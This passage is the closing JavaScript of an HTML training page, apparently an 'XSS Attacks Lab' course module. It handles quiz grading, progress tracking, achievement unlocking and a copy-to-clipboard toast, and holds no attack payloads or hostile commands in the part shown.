            questionDiv.querySelectorAll('.quiz-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            questionDiv.querySelector(`[data-answer="${answer}"]`).classList.add('selected');
        }

        function submitQuiz() {
            if (Object.keys(userAnswers).length < 8) {
                alert('Please answer all questions before submitting.');
                return;
            }

            let correct = 0;

            // Check answers and update UI
            for (let i = 1; i <= 8; i++) {
                const questionDiv = document.querySelector(`[data-question="${i}"]`);
                const correctAnswer = quizAnswers[i];
                const userAnswer = userAnswers[i];

                questionDiv.querySelectorAll('.quiz-option').forEach(opt => {
                    opt.classList.remove('selected', 'correct', 'incorrect');

                    if (opt.dataset.answer === correctAnswer) {
                        opt.classList.add('correct');
                    }

                    if (opt.dataset.answer === userAnswer && userAnswer !== correctAnswer) {
                        opt.classList.add('incorrect');
                    }
                });

                if (userAnswer === correctAnswer) {
                    correct++;
                }
            }

            const percentage = Math.round((correct / 8) * 100);
            const passed = correct >= 6;

            const resultsDiv = document.getElementById('quizResults');
            resultsDiv.innerHTML = `
                <div class="quiz-results">
                    <h3 style="margin-top: 0; color: ${passed ? '#22c55e' : '#dc2626'};">
                        ${passed ? 'Congratulations!' : 'Not Quite There'}
                    </h3>
                    <div class="quiz-score">${correct} / 8</div>
                    <p style="font-size: 1.2em; margin: 10px 0;">${percentage}%</p>
                    <p style="color: #d0d0d0;">
                        ${passed ? 'You have demonstrated strong understanding of XSS attacks!' : 'Review the material and try again. You need 6/8 to pass.'}
                    </p>
                </div>
            `;
            resultsDiv.style.display = 'block';

            // Update sidebar
            document.getElementById('sidebarQuiz').textContent = passed ? 'Passed!' : 'Failed';
            document.getElementById('sidebarQuiz').style.color = passed ? '#22c55e' : '#dc2626';

            // Track completion if passed
            if (passed) {
                if (typeof ModuleProgress !== 'undefined') {
                    ModuleProgress.completeModule('xss-attacks-lab');
                }
                if (typeof AchievementManager !== 'undefined') {
                    AchievementManager.unlock('xss_master');
                }
            }
        }

        function resetQuiz() {
            Object.keys(userAnswers).forEach(key => delete userAnswers[key]);

            document.querySelectorAll('.quiz-option').forEach(opt => {
                opt.classList.remove('selected', 'correct', 'incorrect');
            });

            document.getElementById('quizResults').style.display = 'none';
            document.getElementById('sidebarQuiz').textContent = 'Not Started';
            document.getElementById('sidebarQuiz').style.color = '#a0a0a0';
        }

        // ================================
        // UTILITY FUNCTIONS
        // ================================
        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => {
                // Visual feedback
                const toast = document.createElement('div');
                toast.style.cssText = `
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    background: rgba(168, 85, 247, 0.9);
                    color: white;
                    padding: 15px 25px;
                    border-radius: 8px;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                    z-index: 10000;
                    animation: slideIn 0.3s ease;
                `;
                toast.textContent = 'Copied to clipboard!';
                document.body.appendChild(toast);

                setTimeout(() => {
                    toast.style.animation = 'slideOut 0.3s ease';
                    setTimeout(() => toast.remove(), 300);
                }, 2000);
            });
        }

        function updateProgress() {
            const total = 9;
            const viewed = viewedSections.size;
            const percentage = Math.round((viewed / total) * 100);

            document.getElementById('progressBar').style.width = percentage + '%';
            document.getElementById('sidebarProgress').textContent = `${viewed}/${total}`;
        }

        // ================================
        // INITIALIZATION
        // ================================
        document.addEventListener('DOMContentLoaded', () => {
            updateProgress();
            console.log('%c🔓 XSS Attacks Lab Loaded', 'color: #a855f7; font-size: 14px; font-weight: bold;');
            console.log('%cRemember: Use these techniques ethically and only on systems you have permission to test.', 'color: #d0d0d0; font-size: 12px;');
        });

        // Add animation styles
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(400px); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(400px); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
